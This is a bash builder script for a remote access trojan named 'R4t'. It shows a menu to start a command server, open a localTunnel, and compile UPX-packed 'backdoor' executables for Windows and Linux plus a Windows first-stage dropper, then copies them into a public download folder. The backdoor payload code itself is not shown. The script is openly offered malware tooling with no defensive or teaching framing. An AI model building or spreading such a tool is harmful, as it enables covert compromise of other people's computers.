RED=`tput setaf 196`
purple=`tput setaf 129`
lightblue=`tput setaf 14` 
green=`tput setaf 46`
reset=`tput sgr0` 
if [ $(whoami) != "root" ]; then
    echo -e "${RED}Please run this script with root privilages."
fi


function banner(){
    clear
    echo ${RED}
    figlet R4t -f larry3d.flf 
    echo ${purple} ------------------------------------------------------------------
    echo -e "                         By:Andre Flamand" 
    echo -e "                          Version:1.0" 
    echo ${purple} ------------------------------------------------------------------
}

function init(){
    echo -e "${lightblue}Initializing localTunnel"
    xterm -hold -e "node local.js" &> /dev/null &
}


function menu(){
    echo -e "${green}[1] ${RED}Start server"
    echo -e "${green}[2] ${RED}Create backdoor executable"
    echo -e "${green}[3] ${RED}Create firstStage EXE[only for windows] (first create the backdoor exe) "
    read -p "${purple}${lightblue}R4t${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" option
    if [[ $option == 1 ]]; then
        server
        menu
    
    elif [[ $option == 2 ]]; then
        createExe
        menu
    elif [[ $option == 3 ]]; then
        createFirst
        menu
    else
        echo "Select an option"
    fi

}
function server(){
    clear
    xterm -hold -e  "yarn start" &> /dev/null &
}
function createExe(){
    echo -e "${green}[1] ${RED}Create Backdoor for Windows"
    echo -e "${green}[2] ${RED}Create backdoor for Linux"
    read -p "${purple}${lightblue}R4t${purple}@${green}$(whoami)${RED}[${reset}~${RED}]${purple}" option
    if [[ $option == 1 ]]; then
        xterm  -e "wine /root/.wine/drive_c/users/root/'Local Settings'/'Application Data'/Programs/Scripts/pyinstaller.exe   --onefile --upx-dir upx-3.96-win32/upx.exe  clientwin.py; cp dist/clientwin.exe public/files; rm -r dist/clientwin.exe clientwin.spec" &> /dev/null &
    
    elif [[ $option == 2 ]]; then
        pyinstaller --onefile client.py
        cp -r dist/client public/files
        rm -r dist/client client.spec
    else
        echo "Select a valid option"
    fi

}
function createFirst(){
    xterm  -e "wine /root/.wine/drive_c/users/root/'Local Settings'/'Application Data'/Programs/Scripts/pyinstaller.exe   --onefile --upx-dir upx-3.96-win32/upx.exe  firstStage.py; cp dist/firstStage.exe public/files; rm -r dist/firstStage.exe firstStage.spec" &> /dev/null &
}
banner
init
echo "-----------------------"
menu
